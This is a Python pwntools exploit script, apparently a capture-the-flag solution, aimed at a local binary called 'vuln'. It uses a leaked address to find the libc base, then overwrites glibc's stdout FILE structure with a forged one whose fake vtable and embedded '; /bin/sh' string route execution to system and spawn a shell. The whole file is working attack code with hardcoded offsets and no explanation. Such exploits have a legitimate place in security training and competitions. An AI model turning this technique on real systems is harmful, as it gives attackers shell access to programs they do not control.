#!/usr/bin/python3
from pwn import *
gs = '''
b *main + 143
continue
'''
elf = context.binary = ELF('./vuln')
context.terminal = ['tmux', 'splitw', '-hp', '70']
libc = elf.libc
def start():
    if args.GDB:
        return gdb.debug('./vuln', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process('./vuln')
r = start()
#========= exploit here ===================

leak = int(r.recvline().strip(),16)
log.info(f"free leak = {hex(leak)}")
libc.address = leak - 0x60770
log.info(f"puts address = {hex(libc.sym.puts)}")
log.info(f"libc = {hex(libc.address)}")

address = libc.sym._IO_2_1_stdout_
r.sendlineafter(b">", f"{hex(address)}".encode())
libc_base = libc.address 

#fake stdout
payload = p64(0x11111111fbad2005) #_flags
payload += b"; /bin/sh\x00\x00\x00\x00\x00\x00\x00" #
payload += p64(libc_base + 0x21a803) # _IO_read_base
payload += p64(libc_base + 0x21a803) # _IO_write_base
payload += p64(libc_base + 0x21a803) # _IO_write_ptr
payload += p64(libc_base + 0x21a803) # _IO_write_end
payload += p64(libc_base + 0x21a803) # _IO_buf_base
payload += p64(libc_base + 0x21a804) #_IO_buf_end
payload += p64(0) # _IO_save_base
payload += p64(0) # _IO_backup_base
payload += p64(0) # _IO_save_end
payload += p64(0) # _markers

payload += p64(libc_base + 0x21aaa0) # _chain
payload += p64(1) # _fileno _flags2 int 1,0
payload += p64(0xffffffffffffffff) # _old_offset
payload += p64(0) # _cur_column _vtable_offset _shortbuf
payload += p64(libc_base + 2214512) # _lock
payload += p64(0xffffffffffffffff) # _offset
payload += p64(0) # _codecvt
payload += p64(libc_base + 0x21a8d0) # _wide_data
payload += p64(0) # _freeres_list
payload += p64(0) # _freeres_buf
payload += p64(0) # __pad5

payload += p64(0xffffffff) # _mode = -1
payload += p64(0) * 2 # _unused2
payload += p64(libc_base + 0x216018 - 0x38) # vtable
#fake vtable
payload += p64(libc.sym._IO_2_1_stderr_) #
payload += p64(libc.sym._IO_2_1_stdout_) #
payload += p64(libc_base + 0x216018) #

payload += p64(libc_base + 0x3a040) #
payload += p64(libc_base + 0x2a160) #
payload += p64(0) #
#payload += p64(libc_base + libc.sym.system) #
payload += p64(libc.sym.system)
payload += p64(0) * 7 #
payload += p64(0) * 28 #
payload += p64(libc_base + 0x21a828)#


'''
_flags
_IO_read_ptr
_IO_read_end
_IO_read_base
_IO_write_base
_IO_write_ptr
_IO_write_end
_IO_buf_base
_IO_buf_end
_IO_save_base
_IO_backup_base
_IO_save_end
_markers
_chain
_fileno
_flags2
_old_offset
_cur_column
_vtable_offset
_shortbuf
_lock
_offset
_codecvt
_wide_data
_freeres_list
_freeres_buf
__pad5
_mode
_unused2
'''





r.sendline(payload)

#========= interactive ====================
r.interactive()
